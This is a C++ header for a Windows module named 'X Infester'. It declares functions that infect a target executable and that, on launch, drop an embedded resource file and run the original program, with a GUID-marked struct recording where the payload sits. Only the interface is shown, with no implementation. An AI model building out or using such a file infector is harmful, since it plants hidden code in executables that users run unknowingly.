//////////////////////////////////////////////
//X Infester for windows platform
//language:C++
//Module Codes by DBinary
//2015-10-10 
//////////////////////////////////////////////
#pragma once

#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <olectl.h>

#pragma comment(lib, "oleaut32.lib")

#define XINFESTED_FLAG_GUIDS_STRING "c809c2eac8a4495c8720a6ee2e1e63f9"

//////////////////////////////////////////////////////////////////////////
//Infested flag structure
//////////////////////////////////////////////////////////////////////////
struct XINFESTED_FLAG 
{
char    GUIDs[32];								//GUID for mark
size_t  ResourceOffset;							//Resource file offset 
size_t  ResourceSize;							//Resource file size
XINFESTED_FLAG()
{
	strcpy(GUIDs,XINFESTED_FLAG_GUIDS_STRING);
	ResourceOffset=(size_t)-1;
	ResourceSize=0;
}
};



//************************************
// Method:    XInfester_Run
// FullName:  XInfester_Run
// Access:    public 
// Returns:   void
// Qualifier:
// The function should be call in program begin
// it  will free resource file to current path(if the file has been infested.) & CreateProcess for source file
// MakeSure the execution file without parameters 
//************************************
void XInfester_Run();



//************************************
// Method:    XInfester_InfestFile
// FullName:  XInfester_InfestFile
// Access:    public 
// Returns:   BOOL (if succeed return TRUE£¬if failed else FALSE)
// Qualifier:
// Parameter: const char * pDestFileName : The file will be infest
//************************************
BOOL XInfester_InfestFile(const char *pDestFileName);